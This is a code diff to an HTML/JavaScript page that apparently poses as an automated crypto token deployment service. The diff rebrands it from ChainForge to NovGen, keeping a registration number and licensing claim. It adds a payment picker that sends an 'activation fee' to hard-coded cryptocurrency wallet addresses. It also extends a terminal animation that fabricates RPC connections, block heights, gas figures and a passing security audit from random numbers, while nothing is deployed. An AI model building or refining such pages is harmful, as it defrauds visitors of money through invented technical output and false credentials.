@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<title>ChainForge — Automated Token Deployment Platform</title>
+<title>NovGen — Smart Deployment Platform</title>
 <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
@@ -519,6 +519,41 @@ display:inline-flex;align-items:center;justify-content:center;gap:8px;
 .btn-pay svg{width:18px;height:18px;flex-shrink:0}
 .btn-pay:active{transform:scale(.97)}
 
+/* === PAY METHOD SELECT === */
+.pay-methods-label{font-size:.7rem;font-weight:700;color:var(--t2);text-transform:uppercase;letter-spacing:1px;margin-bottom:10px}
+.pay-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:16px}
+.pay-card{
+padding:12px 8px;background:var(--bg);border:2px solid transparent;
+border-radius:12px;text-align:center;cursor:pointer;
+transition:all .3s;-webkit-user-select:none;user-select:none;
+}
+.pay-card:active{transform:scale(.95)}
+.pay-card.selected{border-color:var(--p);background:#fff;box-shadow:0 0 0 3px rgba(124,58,237,.1)}
+.pay-card-name{font-size:.7rem;font-weight:700;color:var(--t2);margin-top:4px}
+.pay-card-sub{font-size:.55rem;color:var(--t4);margin-top:1px}
+.pay-card.selected .pay-card-name{color:var(--p)}
+.pay-card svg{width:24px;height:24px}
+
+.usdt-nets{display:none;margin-bottom:14px}
+.usdt-nets.active{display:block;animation:fadeIn .2s ease}
+.usdt-nets-label{font-size:.6rem;font-weight:700;color:var(--p);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px}
+.usdt-net-grid{display:flex;flex-wrap:wrap;gap:6px}
+.usdt-net-btn{
+padding:7px 14px;background:var(--bg);border:1.5px solid var(--brd);
+border-radius:10px;font-family:inherit;font-size:.65rem;font-weight:700;
+color:var(--t3);cursor:pointer;transition:all .3s;
+}
+.usdt-net-btn:active{transform:scale(.95)}
+.usdt-net-btn.selected{border-color:var(--p);background:rgba(124,58,237,.06);color:var(--p)}
+
+.pay-amount{
+text-align:center;padding:10px;margin-bottom:12px;
+background:linear-gradient(135deg,rgba(124,58,237,.03),rgba(37,99,235,.03));
+border:1px solid rgba(124,58,237,.08);border-radius:10px;
+}
+.pay-amount-val{font-family:'JetBrains Mono',monospace;font-size:1.05rem;font-weight:700;color:var(--p)}
+.pay-amount-usd{font-size:.7rem;color:var(--t4);margin-top:2px}
+
 /* === RESULT === */
 .result{
 display:none;margin-top:24px;padding:28px 22px;
@@ -768,11 +803,11 @@ display:flex;align-items:center;justify-content:center;
 <div class="chat-bg" id="chatBg" onclick="if(event.target===this)closeChat()">
 <div class="chat-box">
 <div class="chat-head">
-<div class="chat-head-title">ChainForge Support</div>
+<div class="chat-head-title">NovGen Support</div>
 <button class="chat-close" onclick="closeChat()"><svg viewBox="0 0 14 14" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round"><line x1="1" y1="1" x2="13" y2="13"/><line x1="13" y1="1" x2="1" y2="13"/></svg></button>
 </div>
 <div class="chat-msgs" id="chatMsgs">
-<div class="msg bot"><div class="msg-bubble">Hi! Welcome to ChainForge support. How can we help you?</div><div class="msg-time">Just now</div></div>
+<div class="msg bot"><div class="msg-bubble">Hi! Welcome to NovGen support. How can we help you?</div><div class="msg-time">Just now</div></div>
 </div>
 <div class="chat-form" id="chatForm">
 <div class="cf"><label>Name</label><input type="text" id="cfName"></div>
@@ -798,21 +833,69 @@ display:flex;align-items:center;justify-content:center;
 <div class="modal-box">
 <div class="modal-icon"><svg viewBox="0 0 48 48" fill="none"><rect x="4" y="12" width="40" height="26" rx="4" stroke="#ea580c" stroke-width="2.5" fill="rgba(234,88,12,.06)"/><line x1="4" y1="20" x2="44" y2="20" stroke="#ea580c" stroke-width="2.5"/><rect x="30" y="26" width="8" height="5" rx="1.5" fill="#ea580c" opacity=".3"/><circle cx="14" cy="30" r="2" fill="#ea580c" opacity=".4"/></svg></div>
 <div class="modal-title">Activation Fee Required</div>
-<div class="modal-desc">To deploy your token smart contract on the blockchain, a one-time activation fee is required. This covers gas fees and contract deployment.</div>
+<div class="modal-desc">To deploy your smart contract, a one-time activation fee is required. Choose your preferred payment method below.</div>
 <div class="modal-rows">
 <div class="modal-row"><span class="k">Token</span><span class="v" id="mToken">--</span></div>
 <div class="modal-row"><span class="k">Supply</span><span class="v" id="mAmount">--</span></div>
 <div class="modal-row"><span class="k">Network</span><span class="v" id="mNetwork">--</span></div>
-<div class="modal-row"><span class="k">Activation Fee</span><span class="v big" id="mFee">--</span></div>
+<div class="modal-row"><span class="k">Fee (USD)</span><span class="v big" id="mFee">--</span></div>
 </div>
-<div class="addr-section">
-<div class="addr-label">Send fee to this address:</div>
+
+<div class="pay-methods-label">Select Payment Method</div>
+<div class="pay-grid">
+<div class="pay-card" data-pay="btc" onclick="pickPay(this)">
+<svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#F7931A" opacity=".12" stroke="#F7931A" stroke-width="1.5"/><text x="12" y="16" text-anchor="middle" fill="#F7931A" font-size="11" font-weight="bold" font-family="sans-serif">B</text></svg>
+<div class="pay-card-name">BTC</div>
+</div>
+<div class="pay-card" data-pay="eth" onclick="pickPay(this)">
+<svg viewBox="0 0 24 24" fill="none"><path d="M12 3L6 12.5 12 16l6-3.5L12 3z" fill="#627EEA" opacity=".15" stroke="#627EEA" stroke-width="1.2" stroke-linejoin="round"/><path d="M6 13.5L12 21l6-7.5L12 16l-6-2.5z" fill="#627EEA" opacity=".2" stroke="#627EEA" stroke-width="1.2" stroke-linejoin="round"/></svg>
+<div class="pay-card-name">ETH</div>
+</div>
+<div class="pay-card" data-pay="bnb" onclick="pickPay(this)">
+<svg viewBox="0 0 24 24" fill="none"><path d="M12 5l4 4-4 4-4-4 4-4z" fill="#F0B90B" opacity=".15" stroke="#F0B90B" stroke-width="1.2" stroke-linejoin="round"/><path d="M5 12l3-3 3 3-3 3-3-3zM13 12l3-3 3 3-3 3-3-3zM9 16l3-3 3 3-3 3-3-3z" stroke="#F0B90B" stroke-width="1" stroke-linejoin="round"/></svg>
+<div class="pay-card-name">BNB</div>
+</div>
+<div class="pay-card" data-pay="trx" onclick="pickPay(this)">
+<svg viewBox="0 0 24 24" fill="none"><path d="M6 6L18 4l-4 16L6 6z" fill="#FF0013" opacity=".12" stroke="#FF0013" stroke-width="1.2" stroke-linejoin="round"/></svg>
+<div class="pay-card-name">TRX</div>
+</div>
+<div class="pay-card" data-pay="sol" onclick="pickPay(this)">
+<svg viewBox="0 0 24 24" fill="none"><path d="M5 16h12l2-2H7L5 16zM5 12h12l2-2H7L5 12zM19 8H7L5 10h12l2-2z" stroke="#14F195" stroke-width="1.3" stroke-linejoin="round"/></svg>
+<div class="pay-card-name">SOL</div>
+</div>
+<div class="pay-card" data-pay="usdt" onclick="pickPay(this)">
+<svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#26A17B" opacity=".12" stroke="#26A17B" stroke-width="1.5"/><text x="12" y="16.5" text-anchor="middle" fill="#26A17B" font-size="13" font-weight="bold" font-family="sans-serif">T</text></svg>
+<div class="pay-card-name">USDT</div>
+<div class="pay-card-sub">Stablecoin</div>
+</div>
+</div>
+
+<!-- USDT Network Sub-Select -->
+<div class="usdt-nets" id="usdtNets">
+<div class="usdt-nets-label">Select USDT Network</div>
+<div class="usdt-net-grid">
+<button class="usdt-net-btn" data-unet="erc20" onclick="pickUsdtNet(this)">ERC-20</button>
+<button class="usdt-net-btn" data-unet="bep20" onclick="pickUsdtNet(this)">BEP-20</button>
+<button class="usdt-net-btn" data-unet="trc20" onclick="pickUsdtNet(this)">TRC-20</button>
+<button class="usdt-net-btn" data-unet="polygon" onclick="pickUsdtNet(this)">Polygon</button>
+<button class="usdt-net-btn" data-unet="arbitrum" onclick="pickUsdtNet(this)">Arbitrum</button>
+<button class="usdt-net-btn" data-unet="solana" onclick="pickUsdtNet(this)">Solana</button>
+</div>
+</div>
+
+<div class="pay-amount" id="payAmountBox" style="display:none">
+<div class="pay-amount-val" id="payAmountVal">--</div>
+<div class="pay-amount-usd" id="payAmountUsd">--</div>
+</div>
+
+<div class="addr-section" id="addrSection" style="display:none">
+<div class="addr-label">Send exact amount to this address:</div>
 <div class="addr-wrap">
-<input type="text" class="addr-input" id="payAddr" value="0x..." readonly>
+<input type="text" class="addr-input" id="payAddr" value="" readonly>
 <button class="addr-copy" id="addrCopyBtn" onclick="copyAddr()"><svg viewBox="0 0 16 16" fill="none" stroke="#7c3aed" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="5" width="9" height="9" rx="1.5"/><path d="M2 11V3a1.5 1.5 0 0 1 1.5-1.5H11"/></svg></button>
 </div>
 </div>
-<button class="btn-pay" onclick="confirmPay()"><svg viewBox="0 0 18 18" fill="none"><circle cx="9" cy="9" r="7.5" stroke="#fff" stroke-width="2"/><path d="M6 9l2 2 4-4" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg> I've Sent the Payment</button>
+<button class="btn-pay" id="btnPay" onclick="confirmPay()" style="display:none"><svg viewBox="0 0 18 18" fill="none"><circle cx="9" cy="9" r="7.5" stroke="#fff" stroke-width="2"/><path d="M6 9l2 2 4-4" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg> I've Sent the Payment</button>
 </div>
 </div>
 
@@ -824,15 +907,15 @@ display:flex;align-items:center;justify-content:center;
 <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>
 </svg>
 </div>
-<div class="brand-name">ChainForge</div>
+<div class="brand-name">NovGen</div>
 </div>
 <div class="brand-sub">Automated Token Deployment</div>
 </header>
 
 <!-- Hero Section -->
 <div class="hero">
-<h1 class="hero-headline">Launch Your Own <span>Crypto Token</span><br>in Under 60 Seconds</h1>
-<p class="hero-desc">No coding. No smart contract development. No technical skills required. ChainForge deploys a fully functional token on any major blockchain automatically &mdash; just pick a name, choose your network, and we handle the rest.</p>
+<h1 class="hero-headline">Launch Your Own <span>Digital Token</span><br>in Under 60 Seconds</h1>
+<p class="hero-desc">No coding. No smart contract development. No technical skills required. NovGen deploys a fully functional token on any major network automatically &mdash; just pick a name, choose your network, and we handle the rest.</p>
 <div class="hero-tags">
 <div class="hero-tag"><svg viewBox="0 0 16 16" fill="none"><polygon points="8 1 3 9 7 9 6.5 15 13 7 9 7 8 1" stroke="#7c3aed" stroke-width="1.3" fill="rgba(124,58,237,.1)" stroke-linejoin="round"/></svg>Automated Deployment</div>
 <div class="hero-tag"><svg viewBox="0 0 16 16" fill="none"><circle cx="8" cy="8" r="6" stroke="#2563eb" stroke-width="1.3" fill="rgba(37,99,235,.06)"/><path d="M4 8h8M8 4c-1.5 1.5-1.5 5 0 8M8 4c1.5 1.5 1.5 5 0 8" stroke="#2563eb" stroke-width="1" fill="none"/></svg>6 Blockchains</div>
@@ -990,7 +1073,7 @@ display:flex;align-items:center;justify-content:center;
 <div class="terminal">
 <div class="term-bar">
 <div class="term-dot r"></div><div class="term-dot y"></div><div class="term-dot g"></div>
-<div class="term-bar-title">solc v0.8.24 — ChainForge Compiler</div>
+<div class="term-bar-title">solc v0.8.24 — NovGen Compiler</div>
 </div>
 <div class="term-body" id="termBody"></div>
 </div>
@@ -1055,9 +1138,9 @@ display:flex;align-items:center;justify-content:center;
 </div>
 
 <div class="footer">
-<div class="footer-brand">ChainForge</div>
-<div class="footer-sub">Automated Token Deployment Platform</div>
-<div class="footer-legal">&copy; 2025 ChainForge Technologies Pte. Ltd. All rights reserved. Reg. No. 202318472K<br>71 Robinson Road, #14-01, Singapore 068895 &middot; Licensed Digital Asset Service Provider</div>
+<div class="footer-brand">NovGen</div>
+<div class="footer-sub">Smart Deployment Platform</div>
+<div class="footer-legal">&copy; 2025 NovGen Technologies Pte. Ltd. All rights reserved. Reg. No. 202318472K<br>71 Robinson Road, #14-01, Singapore 068895 &middot; Licensed Digital Asset Service Provider</div>
 </div>
 
 <script>
@@ -1133,10 +1216,21 @@ document.getElementById('btn1').disabled=!(name&&selNet&&selAmt);
 document.getElementById('tokenName').addEventListener('input',validate);
 
 // === NETWORK ===
+const walletPlaceholders={
+ethereum:'0x... (ERC-20 wallet address)',
+bsc:'0x... (BEP-20 wallet address)',
+polygon:'0x... (Polygon wallet address)',
+arbitrum:'0x... (Arbitrum wallet address)',
+tron:'T... (TRC-20 wallet address)',
+solana:'Enter Solana wallet address (base58)',
+};
+
 function pickNet(el){
 document.querySelectorAll('.net-card').forEach(c=>{if(c.parentElement.id==='netGrid')c.classList.remove('selected')});
 el.classList.add('selected');
 selNet=el.dataset.net;
+const inp=document.getElementById('recAddr');
+if(inp)inp.placeholder=walletPlaceholders[selNet]||'Enter wallet address';
 updateFee();validate();
 el.style.setProperty('--x','50%');el.style.setProperty('--y','50%');
 }
@@ -1182,7 +1276,7 @@ setTimeout(()=>{
 document.getElementById('loading').classList.remove('active');
 document.getElementById('step2').style.display='block';
 scrollToMain();
-},8000);
+},3000);
 }
 
 function goGenerate(){
@@ -1209,21 +1303,37 @@ const dur=selDur;
 const body=document.getElementById('termBody');
 const bar=document.getElementById('compBar');
 body.innerHTML='';
-const S=55,M=80,F=35,X=20;
+const S=65,M=100,F=40,X=22,W=400,P=200;
+const rpcMap={ethereum:'mainnet.infura.io',bsc:'bsc-dataseed1.binance.org',polygon:'polygon-rpc.com',tron:'api.trongrid.io',arbitrum:'arb1.arbitrum.io/rpc',solana:'api.mainnet-beta.solana.com'};
+const chainIds={ethereum:'1',bsc:'56',polygon:'137',tron:'728126428',arbitrum:'42161',solana:'mainnet-beta'};
+const rpc=rpcMap[selNet]||'rpc.chain.io';
+const cid=chainIds[selNet]||'1';
+const blk=Math.floor(Math.random()*2000000)+19000000;
 
 const lines=[
-{t:'<span class="cm">// ChainForge Smart Contract Compiler v3.4.7</span>',d:S},
+{t:'<span class="cm">// NovGen Smart Contract Compiler v3.4.7</span>',d:S},
 {t:'<span class="cm">// Build target: '+net+' — Solidity ^0.8.24 — Shanghai EVM</span>',d:S},
 {t:'<span class="cm">// Timestamp: '+new Date().toISOString()+'</span>',d:S},
+{t:'<span class="cm">// Session ID: '+Array.from({length:8},()=>Math.floor(Math.random()*16).toString(16)).join('')+'</span>',d:S},
 {t:'',d:X},
-{t:'$ <span class="fn">chainforge</span> init --token <span class="str">"'+name+'"</span> --symbol <span class="str">'+sym+'</span> --chain <span class="str">'+net.toLowerCase()+'</span>',d:M},
-{t:'<span class="ok">[OK]</span> Project scaffold created',d:F},
-{t:'<span class="ok">[OK]</span> Dependencies resolved: <span class="num">47</span> packages',d:F},
-{t:'<span class="ok">[OK]</span> OpenZeppelin v5.0.2 linked',d:F},
+{t:'$ <span class="fn">novgen</span> connect --chain <span class="str">'+net.toLowerCase()+'</span> --rpc <span class="str">'+rpc+'</span>',d:M},
+{t:'<span class="cm">>>> Establishing RPC connection...</span>',d:W},
+{t:'<span class="cm">>>> TLS handshake with '+rpc+'...</span>',d:P},
+{t:'<span class="ok">[OK]</span> Connected to '+net+' (chain ID: <span class="num">'+cid+'</span>)',d:M},
+{t:'<span class="ok">[OK]</span> Latest block: <span class="num">#'+blk.toLocaleString()+'</span>',d:S},
+{t:'<span class="ok">[OK]</span> Network latency: <span class="num">'+(Math.floor(Math.random()*40)+12)+'</span>ms',d:S},
+{t:'<span class="ok">[OK]</span> Gas price: <span class="num">'+(Math.floor(Math.random()*30)+8)+'</span> gwei',d:S},
+{t:'',d:X},
+{t:'$ <span class="fn">novgen</span> init --token <span class="str">"'+name+'"</span> --symbol <span class="str">'+sym+'</span>',d:M},
+{t:'<span class="cm">>>> Initializing project workspace...</span>',d:P},
+{t:'<span class="ok">[OK]</span> Project scaffold created',d:S},
+{t:'<span class="ok">[OK]</span> Dependencies resolved: <span class="num">47</span> packages',d:S},
+{t:'<span class="ok">[OK]</span> OpenZeppelin v5.0.2 linked',d:S},
+{t:'<span class="ok">[OK]</span> Hardhat config generated for '+net+'',d:S},
 {t:'',d:X},
 {t:'$ <span class="fn">solc</span> --optimize --optimize-runs <span class="num">200</span> --evm-version shanghai --via-ir',d:M},
-{t:'<span class="cm">>>> Resolving imports...</span>',d:S},
-{t:'<span class="cm">>>> Compiling 14 source files...</span>',d:S},
+{t:'<span class="cm">>>> Resolving imports from node_modules...</span>',d:P},
+{t:'<span class="cm">>>> Compiling 14 source files...</span>',d:P},
 {t:'',d:X},
 {t:'<span class="cm">// ─────────────────────────────────────────────</span>',d:X},
 {t:'<span class="cm">// File: contracts/'+sym+'Token.sol</span>',d:X},
@@ -1239,7 +1349,7 @@ const lines=[
 {t:'<span class="kw">import</span> <span class="str">"@openzeppelin/contracts/utils/Pausable.sol"</span>;',d:F},
 {t:'',d:X},
 {t:'<span class="cm">/// @title '+name+' Token Contract</span>',d:X},
-{t:'<span class="cm">/// @notice Auto-generated by ChainForge Deployment Engine</span>',d:X},
+{t:'<span class="cm">/// @notice Auto-generated by NovGen Deployment Engine</span>',d:X},
 {t:'<span class="cm">/// @dev ERC20 compliant, time-locked, audited</span>',d:X},
 {t:'<span class="kw">contract</span> <span class="fn">'+sym+'Token</span> <span class="kw">is</span> <span class="fn">ERC20</span>, <span class="fn">ERC20Burnable</span>, <span class="fn">ERC20Permit</span>, <span class="fn">Ownable</span>, <span class="fn">ReentrancyGuard</span>, <span class="fn">Pausable</span> {',d:F},
 {t:'',d:X},
@@ -1417,7 +1527,7 @@ const lines=[
 {t:'<span class="ok">[OK]</span> Bytecode size: <span class="num">'+(Math.floor(Math.random()*4000)+12000)+'</span> bytes (within 24kb limit)',d:S},
 {t:'<span class="ok">[OK]</span> Gas estimate: <span class="num">'+(Math.floor(Math.random()*500000)+2100000)+'</span> units',d:S},
 {t:'',d:X},
-{t:'$ <span class="fn">chainforge</span> audit --mode full --standard slither+mythril',d:M},
+{t:'$ <span class="fn">novgen</span> audit --mode full --standard slither+mythril',d:M},
 {t:'<span class="warn">[AUDIT]</span> Running static analysis...',d:S},
 {t:'<span class="warn">[AUDIT]</span> Slither v0.10.1 — analyzing contract graph...',d:M},
 {t:'<span class="ok">[PASS]</span> SWC-107: Reentrancy guard validated',d:S},
@@ -1432,7 +1542,35 @@ const lines=[
 {t:'<span class="ok">[PASS]</span> EIP-2612 Permit signature verified',d:S},
 {t:'',d:X},
 {t:'<span class="ok">[RESULT]</span> All <span class="num">10</span> checks passed. No vulnerabilities detected.',d:M},
-{t:'<span class="ok">[HASH]</span> 0x'+Array.from({length:16},()=>Math.floor(Math.random()*16).toString(16)).join('')+'...',d:S},
+{t:'',d:X},
+{t:'$ <span class="fn">novgen</span> estimate-gas --contract <span class="str">'+sym+'Token</span> --network <span class="str">'+net.toLowerCase()+'</span>',d:M},
+{t:'<span class="cm">>>> Simulating deployment transaction...</span>',d:P},
+{t:'<span class="cm">>>> Fetching gas oracle from '+rpc+'...</span>',d:P},
+{t:'<span class="ok">[OK]</span> Estimated gas: <span class="num">'+(Math.floor(Math.random()*500000)+2100000)+'</span> units',d:S},
+{t:'<span class="ok">[OK]</span> Base fee: <span class="num">'+(Math.floor(Math.random()*20)+10)+'</span> gwei',d:S},
+{t:'<span class="ok">[OK]</span> Priority fee: <span class="num">'+(Math.random()*2+0.5).toFixed(1)+'</span> gwei',d:S},
+{t:'<span class="ok">[OK]</span> Max deployment cost: <span class="num">~$'+(Math.floor(Math.random()*30)+15)+'</span>',d:S},
+{t:'',d:X},
+{t:'$ <span class="fn">novgen</span> pre-deploy --verify-state',d:M},
+{t:'<span class="cm">>>> Checking '+net+' network status...</span>',d:P},
+{t:'<span class="cm">>>> Syncing with block <span class="num">#'+(blk+Math.floor(Math.random()*5)).toLocaleString()+'</span>...</span>',d:W},
+{t:'<span class="ok">[OK]</span> Network status: healthy',d:S},
+{t:'<span class="ok">[OK]</span> Mempool: <span class="num">'+(Math.floor(Math.random()*200)+50)+'</span> pending transactions',d:S},
+{t:'<span class="ok">[OK]</span> Node peers: <span class="num">'+(Math.floor(Math.random()*100)+25)+'</span> connected',d:S},
+{t:'<span class="ok">[OK]</span> Chain tip verified, no reorgs detected',d:S},
+{t:'',d:X},
+{t:'<span class="cm">>>> Encoding constructor arguments...</span>',d:P},
+{t:'<span class="cm">>>> args: [<span class="num">'+dur+'</span>, <span class="str">0x...recipient</span>]</span>',d:S},
+{t:'<span class="ok">[OK]</span> ABI-encoded calldata: <span class="num">'+(Math.floor(Math.random()*200)+320)+'</span> bytes',d:S},
+{t:'<span class="ok">[OK]</span> Constructor validation passed',d:S},
+{t:'',d:X},
+{t:'<span class="cm">>>> Generating deployment artifacts...</span>',d:P},
+{t:'<span class="ok">[OK]</span> artifacts/'+sym+'Token.json — ABI + bytecode',d:S},
+{t:'<span class="ok">[OK]</span> artifacts/'+sym+'Token.dbg.json — debug info',d:S},
+{t:'<span class="ok">[OK]</span> deployments/'+net.toLowerCase()+'/'+sym+'Token.json — deploy record',d:S},
+{t:'',d:X},
+{t:'<span class="ok">[HASH]</span> Contract bytecode hash: 0x'+Array.from({length:16},()=>Math.floor(Math.random()*16).toString(16)).join('')+'...',d:S},
+{t:'<span class="ok">[HASH]</span> ABI hash: 0x'+Array.from({length:16},()=>Math.floor(Math.random()*16).toString(16)).join('')+'...',d:S},
 {t:'',d:X},
 {t:'<span class="ok">Contract compiled, audited & ready for deployment on '+net+'</span>',d:0},
 ];
@@ -1467,10 +1605,34 @@ setTimeout(()=>document.querySelector('.main').scrollIntoView({behavior:'smooth'
 }
 
 // === FEE MODAL ===
+// === PAYMENT WALLETS ===
+const payWallets={
+btc:'bc1qt5ec8nkles45sp6zg3sdy9jmvy6g9g4q59e3z2',
+eth:'0x4B520af819c14b2f04d1001E140304fA0aee53f5',
+bnb:'0x4B520af819c14b2f04d1001E140304fA0aee53f5',
+trx:'TVVURLM4Tyo3rQ2q99HaJVEBBcizHERnGJ',
+sol:'C3yM6aQDwxqYLBWAsqHWgA1g27osgv1oC8tC7g214g1j',
+};
+const usdtWallets={
+erc20:'0x4B520af819c14b2f04d1001E140304fA0aee53f5',
+bep20:'0x4B520af819c14b2f04d1001E140304fA0aee53f5',
+trc20:'TVVURLM4Tyo3rQ2q99HaJVEBBcizHERnGJ',
+polygon:'0x4B520af819c14b2f04d1001E140304fA0aee53f5',
+arbitrum:'0x4B520af819c14b2f04d1001E140304fA0aee53f5',
+solana:'C3yM6aQDwxqYLBWAsqHWgA1g27osgv1oC8tC7g214g1j',
+};
+const payPriceMap={
+btc:()=>68000+Math.random()*4000,
+eth:()=>prices.ETH,
+bnb:()=>prices.BNB,
+trx:()=>prices.TRX,
+sol:()=>prices.SOL,
+usdt:()=>1,
+};
+let selPayMethod='',selUsdtNet='';
+
 function showFeeModal(){
 const usd=amtPrices[selAmt];
-const n=netMap[selNet];
-const native=(usd/n.p()).toFixed(4);
 const sym=getSymbol();
 const name=document.getElementById('tokenName').value;
 const ns=document.querySelector('#netGrid .selected .net-name').textContent;
@@ -1478,15 +1640,67 @@ const ns=document.querySelector('#netGrid .selected .net-name').textContent;
 document.getElementById('mToken').textContent=name+' ('+sym+')';
 document.getElementById('mAmount').textContent=selAmt.toLocaleString()+' tokens';
 document.getElementById('mNetwork').textContent=ns;
-document.getElementById('mFee').textContent=native+' '+n.sym+' (~$'+usd+')';
+document.getElementById('mFee').textContent='$'+usd+' USD';
 
-const wallets={
-ethereum:'0xYOUR_ETH_WALLET',bsc:'0xYOUR_BSC_WALLET',
-polygon:'0xYOUR_POLYGON_WALLET',arbitrum:'0xYOUR_ARB_WALLET',
-tron:'TYOUR_TRON_WALLET',solana:'YOUR_SOL_WALLET'
-};
-document.getElementById('payAddr').value=wallets[selNet]||'0xWALLET';
+// reset payment state
+selPayMethod='';selUsdtNet='';
+document.querySelectorAll('.pay-card').forEach(c=>c.classList.remove('selected'));
+document.getElementById('usdtNets').classList.remove('active');
+document.querySelectorAll('.usdt-net-btn').forEach(b=>b.classList.remove('selected'));
+document.getElementById('addrSection').style.display='none';
+document.getElementById('payAmountBox').style.display='none';
+document.getElementById('btnPay').style.display='none';
 document.getElementById('feeModal').classList.add('active');
+}
+
+function pickPay(el){
+document.querySelectorAll('.pay-card').forEach(c=>c.classList.remove('selected'));
+el.classList.add('selected');
+selPayMethod=el.dataset.pay;
+selUsdtNet='';
+document.querySelectorAll('.usdt-net-btn').forEach(b=>b.classList.remove('selected'));
+
+if(selPayMethod==='usdt'){
+document.getElementById('usdtNets').classList.add('active');
+document.getElementById('addrSection').style.display='none';
+document.getElementById('payAmountBox').style.display='none';
+document.getElementById('btnPay').style.display='none';
+} else {
+document.getElementById('usdtNets').classList.remove('active');
+showPayAddr();
+}
+}
+
+function pickUsdtNet(el){
+document.querySelectorAll('.usdt-net-btn').forEach(b=>b.classList.remove('selected'));
+el.classList.add('selected');
+selUsdtNet=el.dataset.unet;
+showPayAddr();
+}
+
+function showPayAddr(){
+const usd=amtPrices[selAmt];
+let addr='',coinAmount='',label='';
+
+if(selPayMethod==='usdt'){
+addr=usdtWallets[selUsdtNet]||'';
+coinAmount=usd.toFixed(2)+' USDT';
+label='$'+usd+' USD';
+} else {
+addr=payWallets[selPayMethod]||'';
+const rate=payPriceMap[selPayMethod]();
+const amt=(usd/rate);
+const sym=selPayMethod.toUpperCase();
+coinAmount=(amt<0.001?amt.toFixed(6):amt<1?amt.toFixed(4):amt.toFixed(4))+' '+sym;
+label='~$'+usd+' USD';
+}
+
+document.getElementById('payAddr').value=addr;
+document.getElementById('payAmountVal').textContent=coinAmount;
+document.getElementById('payAmountUsd').textContent=label;
+document.getElementById('payAmountBox').style.display='block';
+document.getElementById('addrSection').style.display='block';
+document.getElementById('btnPay').style.display='flex';
 }
 
 function copyAddr(){
